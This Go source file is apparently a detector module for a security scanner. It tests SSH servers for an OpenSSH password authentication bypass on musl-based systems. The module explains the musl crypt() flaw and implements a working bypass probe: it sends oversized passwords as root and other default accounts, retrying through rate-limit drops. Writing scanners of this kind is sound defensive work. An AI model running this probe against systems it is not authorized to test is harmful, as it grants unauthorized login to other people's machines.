/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Package opensshauthbypass detects the OpenSSH password authentication bypass
// vulnerability on musl-based systems (such as Alpine Linux).
package opensshauthbypass

import (
	"context"
	"errors"
	"fmt"
	"slices"
	"strings"
	"time"

	"github.com/google/goonami-scanner/common/clients/sshclient"
	"github.com/google/goonami-scanner/core/config"
	"github.com/google/goonami-scanner/core/log"
	"github.com/google/goonami-scanner/core/module"
	"github.com/google/goonami-scanner/core/net/netendpoint"
	"github.com/google/goonami-scanner/core/net/netservice"

	dpb "github.com/google/tsunami-security-scanner/proto/go/detection_go_proto"
	npb "github.com/google/tsunami-security-scanner/proto/go/network_go_proto"
	nspb "github.com/google/tsunami-security-scanner/proto/go/network_service_go_proto"
	rpb "github.com/google/tsunami-security-scanner/proto/go/reconnaissance_go_proto"
	vpb "github.com/google/tsunami-security-scanner/proto/go/vulnerability_go_proto"
	tspb "google.golang.org/protobuf/types/known/timestamppb"
)

const (
	moduleName = "dt/opensshauthbypass"

	// openSSHBannerPrefix restricts probing to SSH servers advertising OpenSSH.
	openSSHBannerPrefix = "SSH-2.0-OpenSSH"

	// probePasswordLen is between musl's SHA-256/SHA-512 KEY_MAX (256) and
	// OpenSSH's MAX_PASSWORD_LEN (1024), triggering musl crypt() to fail and
	// return "*".
	probePasswordLen = 512

	// shortProbePassword is <= 256 bytes so musl crypt() hashes it normally
	// instead of returning "*".
	shortProbePassword = "goonami-invalid-short-probe"

	// maxPenaltyCooldownRetries is the maximum number of retry attempts when
	// OpenSSH 9.8+ PerSourcePenalties drops a connection before sending a banner.
	maxPenaltyCooldownRetries = 10

	// defaultPenaltyCooldownSleep is the delay between pre-banner drop retries.
	defaultPenaltyCooldownSleep = 3 * time.Second
)

// candidateUsernames are checked sequentially for '*' shadow entries, covering
// both root and common non-root default accounts when PermitRootLogin is disabled.
var candidateUsernames = []string{"root", "alpine", "sshuser", "admin", "user", "guest"}

// standardSSHPorts are standard and fleet-observed alternative SSH ports probed
// even when Nmap labels a rate-limited service as "tcpwrapped" or falls back to
// static port-table names (such as "EtherNetIP-1" on 2222 or "down" on 2022 when
// version detection is disabled or blocked by PerSourcePenalties).
var standardSSHPorts = []uint32{22, 26, 222, 1022, 2022, 2222, 3389}

type authAttemptResult int

const (
	authAttemptRejected authAttemptResult = iota
	authAttemptAccepted
	authAttemptAborted
)

// Module implements the module.VulnDetector interface for OpenSSH musl password
// authentication bypass detection.
type Module struct {
	*module.BaseModule
	config        *config.Config
	client        *sshclient.Client
	cooldownSleep time.Duration
}

func init() {
	module.RegisterDetector(moduleName, New)
}

// New returns a new instance of the OpenSSH password authentication bypass detector.
func New(ctx context.Context, cfg *config.Config) (module.VulnDetector, error) {
	return &Module{
		BaseModule:    module.NewBaseModule(moduleName),
		config:        cfg,
		client:        sshclient.New(cfg),
		cooldownSleep: defaultPenaltyCooldownSleep,
	}, nil
}

// Advisories returns the base vulnerability metadata reported by this module.
func (m *Module) Advisories() []*vpb.Vulnerability {
	return []*vpb.Vulnerability{baseVulnerability()}
}

func baseVulnerability() *vpb.Vulnerability {
	return vpb.Vulnerability_builder{
		MainId: vpb.VulnerabilityId_builder{
			Publisher: "GOOGLE",
			Value:     "OPENSSH_MUSL_PASSWORD_AUTH_BYPASS",
		}.Build(),
		RelatedId: []*vpb.VulnerabilityId{
			vpb.VulnerabilityId_builder{
				Publisher: "CVE",
				Value:     "CVE-2026-123158",
			}.Build(),
		},
		Severity:       vpb.Severity_CRITICAL,
		Title:          "OpenSSH Password Authentication Bypass on musl-based Systems",
		Description:    "The OpenSSH server is vulnerable to a password authentication bypass when linked against musl libc. When authenticating an account whose shadow password field is '*' (such as the default root entry on Alpine Linux) and at least one other account on the system has a modular crypt password hash (such as SHA-512), supplying a password longer than 256 bytes causes musl's crypt() implementation to fail and return '*', matching the locked shadow entry and granting unauthorized access.",
		Recommendation: "Upgrade OpenSSH to a patched version (such as openssh 9.9_p2-r1 or later on Alpine Linux), or disable password authentication (PasswordAuthentication no) in sshd_config.",
	}.Build()
}

// Detect probes the target network service for the OpenSSH + musl crypt()
// password authentication bypass vulnerability.
func (m *Module) Detect(ctx context.Context, service *nspb.NetworkService) (*dpb.DetectionReportList, error) {
	ctx = log.ContextForModuleAndService(ctx, m.Name(), service) // NOMUTANTS -- diagnostic logging context only
	if err := ctx.Err(); err != nil {
		return nil, err
	}

	if !isSupportedService(service) {
		return nil, nil
	}

	addr, err := netendpoint.ToURIAuthority(service.GetNetworkEndpoint())
	if err != nil {
		return nil, err
	}

	verifiedUser, vulnerable, err := m.checkTarget(ctx, addr)
	if err != nil {
		return nil, err
	}
	if !vulnerable {
		return nil, nil
	}

	return buildDetectionReport(service, verifiedUser), nil
}

func isSupportedService(service *nspb.NetworkService) bool {
	if netservice.IsWebService(service) || netservice.HasTLS(service) {
		return false
	}
	if proto := service.GetTransportProtocol(); proto != npb.TransportProtocol_TRANSPORT_PROTOCOL_UNSPECIFIED && proto != npb.TransportProtocol_TCP {
		return false
	}
	if software := strings.ToLower(strings.TrimSpace(service.GetSoftware().GetName())); software != "" {
		return strings.Contains(software, "openssh")
	}
	if slices.Contains(standardSSHPorts, service.GetNetworkEndpoint().GetPort().GetPortNumber()) {
		return true
	}
	svcName := strings.ToLower(strings.TrimSpace(service.GetServiceName()))
	return svcName == "" || svcName == "unknown" || svcName == "ssh"
}

func (m *Module) checkTarget(ctx context.Context, addr string) (string, bool, error) {
	for _, username := range candidateUsernames {
		// 1. Probe with a >256-byte password ("AAA..."). On vulnerable OpenSSH + musl
		// targets where /etc/shadow has '*' for the account and a modular crypt salt
		// from another account, musl crypt() fails on >256 bytes and returns "*".
		res, err := m.tryPassword(ctx, addr, username, strings.Repeat("A", probePasswordLen))
		if err != nil {
			return "", false, err
		}
		if res == authAttemptAborted {
			return "", false, nil
		}
		if res == authAttemptRejected {
			continue
		}

		// 2. Verify with a second distinct >256-byte password ("BBB...") to rule out
		// the first probe coincidentally matching an actual password.
		res, err = m.tryPassword(ctx, addr, username, strings.Repeat("B", probePasswordLen))
		if err != nil {
			return "", false, err
		}
		if res != authAttemptAccepted {
			continue
		}

		// 3. Negative validation: verify that a <=256-byte invalid password is
		// rejected to rule out honeypots or servers accepting all passwords.
		shortRes, err := m.tryPassword(ctx, addr, username, shortProbePassword)
		if err != nil {
			return "", false, err
		}
		if shortRes != authAttemptRejected {
			log.DebugContextf(ctx, log.DebugLevelService, "target did not reject short invalid password; skipping accept-all service") // NOMUTANTS -- diagnostic logging only
			return "", false, nil
		}
		return username, true, nil
	}

	return "", false, nil
}

func (m *Module) tryPassword(ctx context.Context, addr, username, password string) (authAttemptResult, error) {
	// We supply the password twice within the same SSH connection because on
	// OpenSSH + musl systems using /etc/shadow, the first password attempt in a
	// connection initializes pick_salt()'s static salt buffer (clobbering
	// getspnam()'s static line buffer), while the second attempt in the same
	// connection reuses the cached salt without calling getspnam(), preserving
	// pw_password ("*") for strcmp("*", "*").
	for attempt := range maxPenaltyCooldownRetries + 1 {
		if attempt > 0 {
			log.DebugContextf(ctx, log.DebugLevelService, "SSH connection to %s dropped before banner (likely PerSourcePenalties cooldown); retrying in %v (attempt %d/%d)", addr, m.cooldownSleep, attempt, maxPenaltyCooldownRetries) // NOMUTANTS -- diagnostic logging only
			if err := sleepWithContext(ctx, m.cooldownSleep); err != nil {
				return authAttemptAborted, err
			}
		}
		conn, err := m.client.ConnectWithBannerPrefix(ctx, addr, username, openSSHBannerPrefix, password, password)
		if err == nil {
			_ = conn.Close()
			return authAttemptAccepted, nil
		}
		if ctxErr := ctx.Err(); ctxErr != nil {
			return authAttemptAborted, ctxErr
		}
		if errors.Is(err, sshclient.ErrAuthFailed) {
			return authAttemptRejected, nil
		}
		if errors.Is(err, sshclient.ErrPasswordAuthUnsupported) {
			return authAttemptAborted, nil
		}
		if errors.Is(err, sshclient.ErrConnectionDropped) {
			continue
		}
		if errors.Is(err, sshclient.ErrNotSSHService) {
			return authAttemptAborted, nil
		}
		return authAttemptAborted, err
	}
	return authAttemptAborted, nil
}

func sleepWithContext(ctx context.Context, d time.Duration) error {
	timer := time.NewTimer(d)
	defer timer.Stop() // NOMUTANTS -- defensive timer cleanup on early cancellation
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}

func buildDetectionReport(service *nspb.NetworkService, verifiedUser string) *dpb.DetectionReportList {
	vuln := baseVulnerability()
	vuln.SetAdditionalDetails([]*vpb.AdditionalDetail{
		vpb.AdditionalDetail_builder{
			Description: "Authentication bypass verified for locked account using >256-byte password",
			TextData: vpb.TextData_builder{
				Text: fmt.Sprintf("Successfully authenticated as %q with distinct %d-byte passwords while rejecting <=256-byte passwords.", verifiedUser, probePasswordLen),
			}.Build(),
		}.Build(),
	})

	return dpb.DetectionReportList_builder{
		DetectionReports: []*dpb.DetectionReport{
			dpb.DetectionReport_builder{
				TargetInfo: rpb.TargetInfo_builder{
					NetworkEndpoints: []*npb.NetworkEndpoint{
						service.GetNetworkEndpoint(),
					},
				}.Build(),
				NetworkService:     service,
				DetectionTimestamp: tspb.Now(),
				DetectionStatus:    dpb.DetectionStatus_VULNERABILITY_VERIFIED,
				Vulnerability:      vuln,
			}.Build(),
		},
	}.Build()
}
